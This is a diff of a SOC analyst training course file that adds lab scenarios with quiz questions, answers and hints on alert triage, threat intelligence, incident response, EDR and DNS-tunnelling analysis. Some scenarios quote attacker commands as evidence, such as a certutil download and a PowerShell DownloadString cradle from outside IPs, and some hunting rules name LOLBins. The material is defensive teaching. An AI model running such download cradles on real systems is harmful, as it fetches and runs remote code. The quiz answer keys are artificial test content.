+          question: "What type of network does the outbound connection from WS-MKT-05 attempt to reach?",
+          answer: "Tor",
+          hint: "Check the destination IP classification and port number."
+        }
+      ]
+    }
   },
   {
     id: "5.2",
@@ -3554,7 +4124,37 @@ Add scanner IPs to allowlist for this rule
       "Enrich IOCs with threat intelligence and reputation data",
       "Gather context about affected assets and users",
       "Document every triage decision with reasoning"
-    ]
+    ],
+    practicalExercise: {
+      title: "Alert Triage Prioritization",
+      description: "Prioritize and triage multiple simultaneous alerts effectively.",
+      steps: [
+        "Assess each alert's severity and context",
+        "Determine investigation priority order",
+        "Identify which alerts require immediate escalation",
+      ],
+      labScenario: "Five alerts arrive in your queue within 2 minutes. Alert A: Low severity — antivirus quarantined a known adware PUP on a marketing laptop. Alert B: High severity — EDR detected Mimikatz execution on domain controller DC-02 at 3:00 AM. Alert C: Medium severity — outbound connection to a Tor exit node from a developer workstation, lasting 3 seconds. Alert D: Critical severity — DLP alert showing 5GB upload to external storage from the CFO's laptop. Alert E: Medium severity — port scan detected from internal IP 10.0.1.100 targeting the server subnet.",
+      labQuestions: [
+        {
+          id: "5.2-q1",
+          question: "Which alert should you investigate first?",
+          answer: "Alert B",
+          hint: "Mimikatz on a domain controller is the highest-impact threat — credential theft on the most critical asset."
+        },
+        {
+          id: "5.2-q2",
+          question: "Which alert can safely be deprioritized or closed with minimal investigation?",
+          answer: "Alert A",
+          hint: "The antivirus already quarantined a low-risk PUP — this is largely handled."
+        },
+        {
+          id: "5.2-q3",
+          question: "Which two alerts together might indicate a coordinated attack (lateral movement + exfiltration)?",
+          answer: "Alert B and Alert D",
+          hint: "Credential theft on a DC followed by large data exfiltration from an executive's laptop could be linked."
+        },
+      ]
+    },
   },
   {
     id: "5.3",
@@ -3735,7 +4335,43 @@ If you can't determine TP vs FP:
       "Use multiple verification sources for IOC analysis",
       "Analyze process chains and behavioral baselines",
       "When uncertain, document thoroughly and escalate"
-    ]
+    ],
+    practicalExercise: {
+      title: "TP/FP Classification",
+      description: "Determine whether alerts are true positives or false positives.",
+      steps: [
+        "Analyze each alert with available context",
+        "Apply verification checks to classify the alert",
+        "Document your reasoning for each classification",
+      ],
+      labScenario: "You must classify four alerts during your shift. Alert 1: SIEM flags 'powershell.exe spawned by excel.exe' on WS-FIN-01. The user confirms they opened a macro-enabled spreadsheet from an unknown external sender. Alert 2: EDR detects 'psexec.exe' on server SRV-APP-01. The change management system shows an approved maintenance ticket for that server by the sysadmin team at that exact time. Alert 3: Firewall blocks outbound traffic to a known malicious IP from workstation WS-DEV-05. DNS logs show the user visited a compromised website 2 minutes prior. Alert 4: IDS alerts on 'SQL injection attempt' from the company's own vulnerability scanner IP during a scheduled scan window.",
+      labQuestions: [
+        {
+          id: "5.3-q1",
+          question: "Is Alert 1 (PowerShell from Excel, unknown sender) a true positive or false positive?",
+          answer: "true positive",
+          hint: "PowerShell spawned by Excel from an unknown external sender is highly suspicious behavior."
+        },
+        {
+          id: "5.3-q2",
+          question: "Is Alert 2 (PsExec during approved maintenance) a true positive or false positive?",
+          answer: "false positive",
+          hint: "The activity matches an approved change management ticket — it's expected behavior."
+        },
+        {
+          id: "5.3-q3",
+          question: "Is Alert 4 (SQL injection from vulnerability scanner) a true positive or false positive?",
+          answer: "false positive",
+          hint: "The source is the company's own scanner running during a scheduled window."
+        },
+        {
+          id: "5.3-q4",
+          question: "For Alert 3, what likely caused the malicious IP connection?",
+          answer: "compromised website",
+          hint: "The user visited a compromised website 2 minutes before the blocked connection."
+        },
+      ]
+    },
   },
   {
     id: "5.4",
@@ -3948,7 +4584,37 @@ on_alert:
       "Query internal systems (CMDB, IAM) for asset and user context",
       "Check historical data for previous alerts and known patterns",
       "Automate enrichment to speed up triage and ensure consistency"
-    ]
+    ],
+    practicalExercise: {
+      title: "Alert Enrichment",
+      description: "Enrich alerts with additional context to support investigation decisions.",
+      steps: [
+        "Query threat intelligence for IOC reputation",
+        "Check asset inventory for affected host details",
+        "Review user context and historical activity",
+      ],
+      labScenario: "A medium-severity alert fires: workstation WS-HR-04 connected to IP 198.51.100.77 on port 443. You need to enrich this alert before deciding on escalation. Your threat intel platform shows the IP was flagged by 2 out of 80 vendors as 'suspicious' 6 months ago but has no recent reports. WHOIS shows the IP is registered to a legitimate cloud hosting provider in Germany. The CMDB shows WS-HR-04 belongs to 'anna.kowalski' in the HR department — the machine has no special permissions. Checking Anna's login history, she logged in from her usual office IP this morning. Her browser history shows she clicked a link from a LinkedIn message 5 minutes before the alert.",
+      labQuestions: [
+        {
+          id: "5.4-q1",
+          question: "Based on the threat intel enrichment, is the IP reputation high-risk or low-risk?",
+          answer: "low-risk",
+          hint: "Only 2/80 vendors flagged it, the reports are 6 months old, and it belongs to a legitimate hosting provider."
+        },
+        {
+          id: "5.4-q2",
+          question: "What user action likely triggered the connection to the suspicious IP?",
+          answer: "clicked LinkedIn link",
+          hint: "Check the browser history for activity immediately before the alert."
+        },
+        {
+          id: "5.4-q3",
+          question: "What additional enrichment source would help determine if the LinkedIn link was malicious?",
+          answer: "URL scanner",
+          hint: "Tools like VirusTotal or URLScan can analyze the reputation and behavior of the URL she clicked."
+        },
+      ]
+    },
   },
   {
     id: "5.5",
@@ -4168,6 +4834,33 @@ Before escalating:
         "Determine if escalation is needed",
         "Complete an escalation template",
         "Identify any missing information for the handoff"
+      ],
+      labScenario: "At 14:32 UTC, your SIEM generates a high-severity alert: 'Data Exfiltration Detected — Outbound Transfer Exceeds Threshold.' Workstation WS-FIN-07 belonging to user 'sarah.chen' from the Finance department uploaded 2.3 GB of data to an external cloud storage service (mega.nz) over HTTPS. The transfer occurred during business hours. Checking the DLP logs, you find the transferred files include 'Q4_Financial_Report.xlsx', 'Employee_Salary_Data.csv', and 'Board_Meeting_Notes.docx'. Sarah's manager confirms she was not authorized to transfer these files externally. Her account shows no signs of compromise — MFA is enabled, and the login originated from her usual office IP.",
+      labQuestions: [
+        {
+          id: "5.5-q1",
+          question: "Based on the evidence, is this alert more likely a true positive or false positive?",
+          answer: "true positive",
+          hint: "The manager confirmed the transfer was unauthorized."
+        },
+        {
+          id: "5.5-q2",
+          question: "What type of insider threat does this scenario most likely represent?",
+          answer: "insider threat",
+          hint: "The user's account is not compromised — the actions came from the legitimate user."
+        },
+        {
+          id: "5.5-q3",
+          question: "Should this alert be escalated to L2? Answer yes or no.",
+          answer: "yes",
+          hint: "Consider the sensitivity of the data and the unauthorized nature of the transfer."
+        },
+        {
+          id: "5.5-q4",
+          question: "What external service was used to exfiltrate the data?",
+          answer: "mega.nz",
+          hint: "Check the cloud storage destination mentioned in the alert."
+        }
       ]
     }
   },
@@ -4294,7 +4987,44 @@ As a SOC analyst, develop these habits:
     additionalResources: [
       { title: "MITRE ATT&CK Framework", type: "documentation", url: "https://attack.mitre.org" },
       { title: "Threat Intelligence 101", type: "article", url: "https://www.sans.org" }
-    ]
+    ],
+    practicalExercise: {
+      title: "Threat Intelligence Application",
+      description: "Apply threat intelligence to enrich alerts and identify threat actor activity.",
+      steps: [
+        "Review the scenario with IOC and intelligence data",
+        "Correlate indicators with known threat groups",
+        "Determine the appropriate intelligence actions",
+        "Answer the questions based on your analysis"
+      ],
+      labScenario: "Your threat intel feed delivers an urgent advisory: APT group 'ShadowViper' is actively targeting financial institutions using spear-phishing emails with PDF attachments exploiting CVE-2024-1234. Known IOCs include C2 domain 'update-service.shadow-cdn.com', file hash 'a1b2c3d4e5f6...', and callback IP 185.192.40.12. Minutes later, your SIEM shows a DNS query for 'update-service.shadow-cdn.com' from workstation WS-FIN-09. The workstation user 'maria.santos' opened a PDF attachment from an email received 20 minutes ago. EDR telemetry shows Adobe Reader spawning cmd.exe on the same workstation.",
+      labQuestions: [
+        {
+          id: "6.1-q1",
+          question: "What APT group is attributed to this campaign targeting financial institutions?",
+          answer: "ShadowViper",
+          hint: "Check the threat intel advisory for the group name."
+        },
+        {
+          id: "6.1-q2",
+          question: "What C2 domain from the advisory was resolved by the compromised workstation?",
+          answer: "update-service.shadow-cdn.com",
+          hint: "Match the DNS query with the IOCs in the threat advisory."
+        },
+        {
+          id: "6.1-q3",
+          question: "What application spawned cmd.exe, indicating the exploit was triggered?",
+          answer: "Adobe Reader",
+          hint: "Check the EDR telemetry for the parent process of cmd.exe."
+        },
+        {
+          id: "6.1-q4",
+          question: "What type of threat intelligence is this advisory — strategic, tactical, operational, or technical?",
+          answer: "tactical",
+          hint: "Consider which intelligence type describes adversary TTPs and IOCs."
+        }
+      ]
+    }
   },
   {
     id: "6.2",
@@ -4601,7 +5331,37 @@ Analysis:
       { title: "VirusTotal", type: "tool", url: "https://www.virustotal.com" },
       { title: "AbuseIPDB", type: "tool", url: "https://www.abuseipdb.com" },
       { title: "Shodan", type: "tool", url: "https://www.shodan.io" }
-    ]
+    ],
+    practicalExercise: {
+      title: "OSINT Investigation",
+      description: "Use open-source intelligence tools to investigate suspicious indicators.",
+      steps: [
+        "Query public databases for IP and domain intelligence",
+        "Analyze WHOIS and DNS records for attribution",
+        "Cross-reference findings across multiple OSINT sources",
+      ],
+      labScenario: "During an investigation, you extract three IOCs that need OSINT enrichment. IOC 1: IP address 185.220.101.45 — your firewall blocked outbound connections to this IP from two internal hosts. IOC 2: Domain 'secure-update-portal.com' — found in a phishing email sent to 5 employees. IOC 3: File hash 'e99a18c428cb38d5f260853678922e03' — extracted from a suspicious attachment on one employee's workstation. You check AbuseIPDB (185.220.101.45 reported 500+ times for malware), WHOIS (domain registered 3 days ago with privacy protection), and VirusTotal (hash detected by 52/72 engines as Emotet).",
+      labQuestions: [
+        {
+          id: "6.3-q1",
+          question: "Based on AbuseIPDB results, what is IP 185.220.101.45 primarily associated with?",
+          answer: "malware",
+          hint: "The IP was reported 500+ times — check what category of abuse it's flagged for."
+        },
+        {
+          id: "6.3-q2",
+          question: "What WHOIS detail about the domain suggests it is malicious?",
+          answer: "registered 3 days ago",
+          hint: "Very recently registered domains with privacy protection are common indicators of malicious infrastructure."
+        },
+        {
+          id: "6.3-q3",
+          question: "What malware family was the suspicious file hash identified as?",
+          answer: "Emotet",
+          hint: "VirusTotal detection results include the malware family classification."
+        },
+      ]
+    },
   },
   {
     id: "6.4",
@@ -4755,6 +5515,33 @@ Enriched Alert to Analyst
         "Research a recent malware sample on ThreatFox",
         "Use Shodan to search for exposed services",
         "Document 5 tools you'll add to your daily workflow"
+      ],
+      labScenario: "During alert triage, you encounter a suspicious file downloaded by a user: 'update_patch.exe'. You extract the SHA256 hash: 'e99a18c428cb38d5f260853678922e03abd836f5d3a4e6f1b3c5e8d9f2a1b4c7'. A VirusTotal scan shows 48/72 vendors flagging it as malicious, categorized as 'Trojan.GenericKD.46543210'. The file was downloaded from 'http://198.51.100.23/updates/patch.exe'. AbuseIPDB shows the IP has been reported 347 times in the last 30 days for malware distribution. AlienVault OTX links this IP to the 'APT29' threat group with a recent pulse titled 'Cozy Bear Infrastructure Update Q1 2025'.",
+      labQuestions: [
+        {
+          id: "6.4-q1",
+          question: "How many VirusTotal vendors flagged the file as malicious?",
+          answer: "48",
+          hint: "Check the detection ratio in the scenario."
+        },
+        {
+          id: "6.4-q2",
+          question: "Which APT group is linked to the IP address used for distribution?",
+          answer: "APT29",
+          hint: "Check the AlienVault OTX information."
+        },
+        {
+          id: "6.4-q3",
+          question: "What is the IP address hosting the malicious file?",
+          answer: "198.51.100.23",
+          hint: "Look at the download URL in the scenario."
+        },
+        {
+          id: "6.4-q4",
+          question: "What is the common name for the APT29 threat group?",
+          answer: "Cozy Bear",
+          hint: "Check the OTX pulse title for the group's alias."
+        }
       ]
     }
   },
@@ -4933,7 +5720,44 @@ As an L1 analyst, you primarily handle:
     additionalResources: [
       { title: "NIST SP 800-61", type: "documentation", url: "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf" },
       { title: "SANS Incident Handler's Handbook", type: "article", url: "https://www.sans.org" }
-    ]
+    ],
+    practicalExercise: {
+      title: "Incident Response Scenario",
+      description: "Walk through an incident response scenario from detection to containment.",
+      steps: [
+        "Review the incident timeline and evidence",
+        "Classify the incident severity",
+        "Determine containment actions",
+        "Answer the questions based on the IR framework"
+      ],
+      labScenario: "At 14:45 UTC, your EDR platform generates a critical alert: ransomware behavior detected on file server FS-CORP-01. The alert shows 'svchost32.exe' (note the '32') encrypting files in the shared drive with '.locked' extension. Investigation reveals the malware entered via a phishing email opened by user 'james.wilson' on WS-HR-02 at 14:20 UTC. The malware moved laterally from WS-HR-02 to FS-CORP-01 using stolen credentials for 'admin-backup'. Network logs show FS-CORP-01 communicating with 91.240.118.55 on port 443. Currently, 340 of 12,000 shared files have been encrypted, and the encryption is ongoing.",
+      labQuestions: [
+        {
+          id: "7.1-q1",
+          question: "What is the FIRST incident response phase you should execute right now?",
+          answer: "containment",
+          hint: "The incident is active and spreading — what phase stops the damage?"
+        },
+        {
+          id: "7.1-q2",
+          question: "What is the name of the suspicious process encrypting files on the file server?",
+          answer: "svchost32.exe",
+          hint: "Check the EDR alert for the process name — note the unusual naming."
+        },
+        {
+          id: "7.1-q3",
+          question: "Which user account was used for lateral movement to the file server?",
+          answer: "admin-backup",
+          hint: "Look at the stolen credentials used to access FS-CORP-01."
+        },
+        {
+          id: "7.1-q4",
+          question: "How did the malware initially enter the environment?",
+          answer: "phishing",
+          hint: "Trace back to the initial compromise vector on WS-HR-02."
+        }
+      ]
+    }
   },
   {
     id: "7.2",
@@ -5808,6 +6632,33 @@ Recommendations:
         "Document a timeline of the incident",
         "Draft a user notification message",
         "Write three recommendations for prevention"
+      ],
+      labScenario: "At 09:15 AM, 12 employees in the HR department received an email from 'ceo@yourcompany-hr.com' (spoofed domain) with subject 'Urgent: Updated Benefits Enrollment'. The email contained a link to 'https://yourcompany-benefits.evil.com/enroll'. Three employees clicked the link and entered their corporate credentials on a fake login page. By 09:45 AM, the SOC detected unusual Office 365 activity: two of the compromised accounts had new inbox rules created forwarding all emails to an external address 'collector@protonmail.com'. One compromised account sent 45 emails to external contacts with an updated malicious link. The attacker also accessed the company's SharePoint and downloaded the 'Employee_Directory.xlsx' file.",
+      labQuestions: [
+        {
+          id: "7.5-q1",
+          question: "How many employees entered their credentials on the phishing page?",
+          answer: "3",
+          hint: "Look at how many employees clicked and submitted credentials."
+        },
+        {
+          id: "7.5-q2",
+          question: "What persistence mechanism did the attacker set up in the compromised mailboxes?",
+          answer: "inbox rules",
+          hint: "Think about how the attacker ensured continued access to emails."
+        },
+        {
+          id: "7.5-q3",
+          question: "What external email address were the forwarded emails sent to?",
+          answer: "collector@protonmail.com",
+          hint: "Check the inbox rule destination."
+        },
+        {
+          id: "7.5-q4",
+          question: "What sensitive file did the attacker download from SharePoint?",
+          answer: "Employee_Directory.xlsx",
+          hint: "Look at the SharePoint access activity."
+        }
       ]
     }
   },
@@ -5971,7 +6822,44 @@ Cost              │ Low       │ Higher
     additionalResources: [
       { title: "CrowdStrike University", type: "documentation", url: "https://www.crowdstrike.com" },
       { title: "Microsoft Defender for Endpoint Docs", type: "documentation", url: "https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/" }
-    ]
+    ],
+    practicalExercise: {
+      title: "EDR Investigation & Process Analysis",
+      description: "Investigate an EDR alert involving suspicious process execution and potential malware.",
+      steps: [
+        "Review the EDR alert and process tree",
+        "Identify the suspicious process chain",
+        "Determine the attacker's objectives",
+        "Answer the questions based on endpoint evidence"
+      ],
+      labScenario: "Your EDR flags a critical alert on workstation WS-DEV-11: 'Suspicious Process Chain Detected.' The process tree shows: excel.exe → mshta.exe → powershell.exe → certutil.exe. The PowerShell command includes '-encodedcommand' with Base64 data. Certutil was used to download a file: 'certutil -urlcache -split -f http://45.77.65.12/update.dll C:\\Users\\Public\\update.dll'. The DLL was then loaded by rundll32.exe establishing a connection to 45.77.65.12 on port 8443. The EDR's threat score is 95/100 and the file hash matches no known signatures in VirusTotal (0/72 detections).",
+      labQuestions: [
+        {
+          id: "8.1-q1",
+          question: "What Office application was the initial entry point in the process chain?",
+          answer: "excel.exe",
+          hint: "Check the first process in the process tree."
+        },
+        {
+          id: "8.1-q2",
+          question: "What Windows utility was abused to download the malicious DLL?",
+          answer: "certutil",
+          hint: "Look for the tool used with -urlcache to fetch a file."
+        },
+        {
+          id: "8.1-q3",
+          question: "The file has 0/72 VirusTotal detections. What does this likely indicate about the malware?",
+          answer: "zero-day",
+          hint: "Consider what it means when no antivirus engine recognizes a malicious file."
+        },
+        {
+          id: "8.1-q4",
+          question: "What directory was the malicious DLL saved to on the workstation?",
+          answer: "C:\\Users\\Public",
+          hint: "Check the certutil download command for the destination path."
+        }
+      ]
+    }
   },
   {
     id: "8.2",
@@ -6644,6 +7532,33 @@ Required Actions:
         "Analyze command lines for suspicious indicators",
         "Check network connections and file operations",
         "Document your findings and recommend actions"
+      ],
+      labScenario: "Your EDR platform generates a critical alert on workstation WS-DEV-03: 'Suspicious Process Chain Detected.' The process tree shows: outlook.exe → cmd.exe → powershell.exe → rundll32.exe. The PowerShell command line contains: 'IEX(New-Object Net.WebClient).DownloadString(\"http://10.0.0.50:8080/payload.ps1\")'. The rundll32.exe process then loaded a DLL from 'C:\\Users\\Public\\svchost.dll' and established a connection to 45.33.32.156 on port 4443. The EDR also detected LSASS memory access by the rundll32 process, indicating credential dumping. The affected user is 'dev-admin' who has local admin privileges on 15 workstations.",
+      labQuestions: [
+        {
+          id: "8.4-q1",
+          question: "What is the parent process that started the malicious chain?",
+          answer: "outlook.exe",
+          hint: "Look at the beginning of the process tree."
+        },
+        {
+          id: "8.4-q2",
+          question: "What technique is indicated by the LSASS memory access?",
+          answer: "credential dumping",
+          hint: "LSASS stores authentication credentials in memory."
+        },
+        {
+          id: "8.4-q3",
+          question: "What port is the C2 connection established on?",
+          answer: "4443",
+          hint: "Check the outbound connection details from rundll32."
+        },
+        {
+          id: "8.4-q4",
+          question: "What internal IP is hosting the PowerShell payload?",
+          answer: "10.0.0.50",
+          hint: "Look at the DownloadString URL in the PowerShell command."
+        }
       ]
     }
   },
@@ -6855,7 +7770,44 @@ Limit lateral movement between zones
     additionalResources: [
       { title: "TCP/IP Guide", type: "documentation", url: "http://www.tcpipguide.com" },
       { title: "Wireshark Documentation", type: "tool", url: "https://www.wireshark.org/docs/" }
-    ]
+    ],
+    practicalExercise: {
+      title: "Network Traffic Analysis",
+      description: "Analyze network traffic patterns to detect DNS tunneling and data exfiltration.",
+      steps: [
+        "Review the network logs and DNS queries",
+        "Identify anomalous traffic patterns",
+        "Determine the data exfiltration method",
+        "Answer the questions based on network evidence"
+      ],
+      labScenario: "Network monitoring detects unusual DNS activity from server SRV-APP-03 (10.10.1.50). Over the past hour, the server made 1,200 DNS TXT record queries to subdomains of 'analytics-data.xyz' — normal servers average 30 DNS queries per hour. Each subdomain contains a long Base64-encoded string like 'dXNlcm5hbWU6YWRtaW4=.analytics-data.xyz'. Simultaneously, NetFlow data shows SRV-APP-03 received 800 MB of data from internal database server DB-PROD-01 (10.10.2.10) over port 1433 (MSSQL). The server SRV-APP-03 has no legitimate reason to query the database. Firewall logs show all outbound traffic from SRV-APP-03 on ports 80/443 is blocked, but DNS (port 53) is allowed.",
+      labQuestions: [
+        {
+          id: "9.1-q1",
+          question: "What type of DNS record is being used for the suspected data exfiltration?",
+          answer: "TXT",
+          hint: "Check the DNS query type in the monitoring alert."
+        },
+        {
+          id: "9.1-q2",
+          question: "What exfiltration technique uses DNS queries to smuggle data out of a network?",
+          answer: "DNS tunneling",
+          hint: "Consider the technique that encodes data in DNS subdomain queries."
+        },
+        {
+          id: "9.1-q3",
+          question: "How much data was transferred from the database server to SRV-APP-03?",
+          answer: "800 MB",
+          hint: "Check the NetFlow data for the transfer volume."
+        },
+        {
+          id: "9.1-q4",
+          question: "Why is the attacker using DNS instead of HTTP/HTTPS for exfiltration?",
+          answer: "DNS is allowed",
+          hint: "Check what the firewall blocks versus what it permits."
+        }
+      ]
+    }
   },
   {
     id: "9.2",
@@ -7593,6 +8545,33 @@ Exfiltration:
         "Look for C2 communication patterns",
         "Find evidence of lateral movement",
         "Detect any data exfiltration indicators"
+      ],
+      labScenario: "Network monitoring tools detect anomalous traffic from server SRV-WEB-01 (192.168.1.100). The IDS flags DNS queries to 'x7k9m2.data-analytics-cdn.com' occurring every 30 seconds — each query encodes a different subdomain that appears to be Base64 data. Simultaneously, Zeek logs show SMB connections from SRV-WEB-01 to 5 internal hosts (192.168.1.50–54) on port 445, all within a 2-minute window. NetFlow data reveals a 500 MB transfer from 192.168.1.52 to SRV-WEB-01, followed by an outbound HTTPS connection from SRV-WEB-01 to 91.234.56.78 on port 8443 transferring 480 MB. The destination IP is not in any known CDN range.",
+      labQuestions: [
+        {
+          id: "9.4-q1",
+          question: "What technique is being used for C2 communication based on the DNS queries?",
+          answer: "DNS tunneling",
+          hint: "Encoded subdomains at regular intervals suggest data hidden in DNS."
+        },
+        {
+          id: "9.4-q2",
+          question: "How many internal hosts did the compromised server connect to via SMB?",
+          answer: "5",
+          hint: "Count the IP range 192.168.1.50 through 54."
+        },
+        {
+          id: "9.4-q3",
+          question: "What is the approximate size of data exfiltrated to the external IP?",
+          answer: "480 MB",
+          hint: "Check the outbound HTTPS transfer size."
+        },
+        {
+          id: "9.4-q4",
+          question: "What port was used for the outbound data exfiltration?",
+          answer: "8443",
+          hint: "Look at the HTTPS connection to the external IP."
+        }
       ]
     }
   },
@@ -7834,6 +8813,33 @@ Annually:
         "Identify what evidence you'd need to test each hypothesis",
         "Practice pivoting from the initial IOC to find related indicators",
         "Build a timeline of the scenario events"
+      ],
+      labScenario: "At 02:17 AM, your SIEM triggers a critical alert: 'Anomalous Privileged Account Activity.' The domain admin account 'da-backup' — normally used only by the backup system — logged in interactively (Event ID 4624, Logon Type 2) from workstation WS-REC-01 in the reception area. Within 8 minutes, the account accessed the Active Directory server (DC-01) via RDP, ran 'ntdsutil' to create a snapshot of the AD database, and copied the file to a USB-connected drive (E:\\backup.dit). No change tickets exist for this maintenance, and the backup team confirms no one was scheduled to work. The account's password was last changed 387 days ago.",
+      labQuestions: [
+        {
+          id: "10.1-q1",
+          question: "What tool was used to extract the Active Directory database?",
+          answer: "ntdsutil",
+          hint: "Check the commands run on the domain controller."
+        },
+        {
+          id: "10.1-q2",
+          question: "What Logon Type indicates an interactive (physical) logon?",
+          answer: "2",
+          hint: "Look at the Event ID 4624 details in the scenario."
+        },
+        {
+          id: "10.1-q3",
+          question: "How many days since the compromised account's password was last changed?",
+          answer: "387",
+          hint: "Check the password age mentioned at the end of the scenario."
+        },
+        {
+          id: "10.1-q4",
+          question: "Where was the AD database file copied to?",
+          answer: "USB",
+          hint: "Look at the destination drive letter and type."
+        }
       ]
     }
   },
@@ -8042,7 +9048,7 @@ A healthy SOC has:
     additionalResources: [
       { title: "Mental Health Resources", type: "article", url: "https://www.mentalhealth.gov" },
       { title: "SOC Analyst Wellbeing Guide", type: "article", url: "https://www.sans.org" }
-    ]
+    ],
   },
   {
     id: "10.3",
@@ -8265,7 +9271,7 @@ Benefits:
       { title: "TryHackMe", type: "tool", url: "https://tryhackme.com" },
       { title: "LetsDefend", type: "tool", url: "https://letsdefend.io" },
       { title: "CyberDefenders", type: "tool", url: "https://cyberdefenders.org" }
-    ]
+    ],
   },
   {
     id: "10.4",
@@ -8478,7 +9484,7 @@ Practice Platforms:
 ├── CyberDefenders: cyberdefenders.org
 
 Community:
-├── BlueTeamers Telegram: @infosecdairiess
+├── InfoSecDairies Telegram: @infosecdairiess
 ├── Discord security servers
 ├── Local security meetups
 
@@ -8647,7 +9653,7 @@ Mastering log analysis is one of the most valuable skills for any security profe
     additionalResources: [
       { title: "NIST Guide to Computer Security Log Management", type: "documentation" },
       { title: "SANS Log Management Best Practices", type: "article" }
-    ]
+    ],
   },
   {
     id: "1.2",
@@ -8794,7 +9800,7 @@ LEEF:Version|Vendor|Product|Version|EventID|
       "JSON is increasingly popular for its flexibility and readability",
       "Windows uses XML-based EVTX format with Event IDs",
       "Understanding log formats is essential for effective parsing and analysis"
-    ]
+    ],
   },
   {
     id: "1.3",
@@ -8945,7 +9951,7 @@ For security monitoring, prioritize:
       "Cloud services have their own logging systems (CloudTrail, Azure Activity)",
       "Authentication logs are the highest priority for security monitoring",
       "EDR provides rich telemetry beyond traditional OS logs"
-    ]
+    ],
   },
   {
     id: "1.4",
@@ -9110,7 +10116,7 @@ Estimate daily log volume:
       "Syslog, WEF, and APIs are common collection methods",
       "Timestamp normalization and field mapping are critical",
       "Plan for log volume and retention requirements"
-    ]
+    ],
   },
   // Module 2: Windows Event Logs
   {
@@ -9271,7 +10277,7 @@ Configure via: **Event Viewer → Log Properties → Maximum log size**
       "Audit policies must be configured to generate security events",
       "Event Viewer and PowerShell are primary tools for log access",
       "Default log sizes are too small—increase for security monitoring"
-    ]
+    ],
   },
   {
     id: "2.2",
@@ -9582,7 +10588,7 @@ When investigating authentication events:
       "Lateral movement typically uses Type 3 (network) logons",
       "Monitor for NTLM usage as it's more vulnerable than Kerberos",
       "Correlate authentication events with subsequent activity (4688)"
-    ]
+    ],
   },
   {
     id: "2.4",
@@ -9759,7 +10765,7 @@ AND CommandLine contains any of ("-urlcache", "-split", "http://", "https://")
       "Watch for LOLBins (certutil, mshta, bitsadmin) used maliciously",
       "Unusual parent-child relationships indicate potential compromise",
       "Encoded PowerShell commands are a major red flag"
-    ]
+    ],
   },
   {
     id: "2.5",
@@ -9945,7 +10951,7 @@ ScriptBlockText contains any of (
       "Watch for download cradles, AMSI bypasses, and obfuscation",
       "Transcription logging creates full session records",
       "Correlate PowerShell events with process creation events"
-    ]
+    ],
   },
   {
     id: "2.6",
@@ -10351,7 +11357,7 @@ w
       "journalctl is the modern way to query logs on systemd systems",
       "auditd provides detailed system call auditing for security",
       "Understanding syslog facilities and priorities helps filter logs"
-    ]
+    ],
   },
   {
     id: "3.2",
@@ -10694,7 +11700,7 @@ grep "UFW BLOCK" /var/log/syslog | awk '{print $12}' | cut -d= -f2 | sort | uniq
       "Cron logs can expose persistence mechanisms",
       "Package manager logs show software installations and removals",
       "AppArmor/SELinux denials indicate blocked malicious behavior"
-    ]
+    ],
   },
   {
     id: "3.4",
@@ -10863,7 +11869,7 @@ awk '$10 > 1000000 {print $1, $7, $10}' access.log
       "SQL injection shows as quotes and SQL keywords in URLs",
       "Web shells have distinctive access patterns (cmd parameters)",
       "Unusual User-Agents often indicate automated attacks"
-    ]
+    ],
   },
   {
     id: "3.5",
@@ -11214,7 +12220,7 @@ Normalized Fields:
     additionalResources: [
       { title: "Gartner SIEM Magic Quadrant", type: "article" },
       { title: "SANS SIEM Guide", type: "documentation" }
-    ]
+    ],
   },
   {
     id: "1.2",
@@ -11396,7 +12402,7 @@ ALERT: Brute Force Attack Detected - 3 failures then success
       "Storage tiers (hot/warm/cold) balance performance with cost",
       "Scalability depends on data volume and search requirements",
       "Cloud SIEMs offer faster deployment but less control over data"
-    ]
+    ],
   },
   {
     id: "1.3",
@@ -11629,7 +12635,7 @@ Regardless of platform, these skills transfer:
     additionalResources: [
       { title: "Splunk Fundamentals 1 (Free)", type: "documentation", url: "https://www.splunk.com/en_us/training/courses/splunk-fundamentals-1.html" },
       { title: "Microsoft Sentinel Training", type: "documentation", url: "https://learn.microsoft.com/en-us/training/paths/security-ops-sentinel/" }
-    ]
+    ],
   },
   {
     id: "1.4",
@@ -11838,7 +12844,7 @@ Report: Complete timeline from initial access to detection
       "Investigation capabilities let analysts pivot and expand from initial alerts",
       "Compliance requires specific log retention and reporting features",
       "Dashboards provide real-time visibility into security posture"
-    ]
+    ],
   },
 
   // Module 2: Data Ingestion & Management
@@ -12108,7 +13114,7 @@ Okta ──────────────────────→ │
       "API collection is essential for cloud services and SaaS applications",
       "Choose collection method based on source type, reliability needs, and overhead",
       "Modern SIEMs support multiple collection methods simultaneously"
-    ]
+    ],
   },
   {
     id: "2.2",
@@ -12360,7 +13366,7 @@ Action: Update parser configuration
       "Field extraction uses regex, key-value, JSON, and delimiter parsing",
       "Timestamps should be normalized to UTC in ISO 8601 format",
       "Enrichment adds valuable context like geo-location and threat intel"
-    ]
+    ],
   },
   {
     id: "2.3",
@@ -12569,7 +13575,7 @@ debug:        7 days
       "Inverted indexes enable fast text-based searching",
       "Plan index strategy based on security domains, compliance, and access needs",
       "Monitor index health for size, performance, and ingestion rates"
-    ]
+    ],
   },
   {
     id: "2.4",
@@ -12804,7 +13810,7 @@ Event → Hot → Warm → Cold → Frozen → PRESERVED INDEFINITELY
       "Data lifecycle management automates transitions between tiers",
       "Filter unnecessary data at ingestion to reduce costs",
       "Legal holds can override normal retention for litigation or investigations"
-    ]
+    ],
   },
 
   // Module 3: Search & Query Fundamentals
@@ -13296,7 +14302,7 @@ earliest=-24h
       "EVAL creates calculated fields for analysis",
       "REX extracts data from unstructured text using regex",
       "SORT, DEDUP, and HEAD/TAIL organize and limit results"
-    ]
+    ],
   },
   {
     id: "3.3",
@@ -13529,7 +14535,7 @@ index=security
       "Asterisk (*) matches zero or more characters",
       "Question mark (?) matches exactly one character",
       "Leading wildcards (*admin) are slower than trailing wildcards (admin*)"
-    ]
+    ],
   },
   {
     id: "3.4",
@@ -14023,7 +15029,7 @@ index=security EventCode=4625
       "Top and rare commands quickly identify common/uncommon values",
       "Group by multiple fields for detailed breakdowns",
       "Aggregation is essential for detecting patterns like brute force attacks"
-    ]
+    ],
   },
   {
     id: "4.2",
@@ -14240,7 +15246,7 @@ index=network action=denied
       "Joins combine results from two different searches",
       "Subsearches use results of one search to filter another",
       "Lookups are generally faster and preferred over joins"
-    ]
+    ],
   },
   {
     id: "4.3",
@@ -14445,7 +15451,7 @@ index=security
       "Use startswith/endswith to define transaction boundaries",
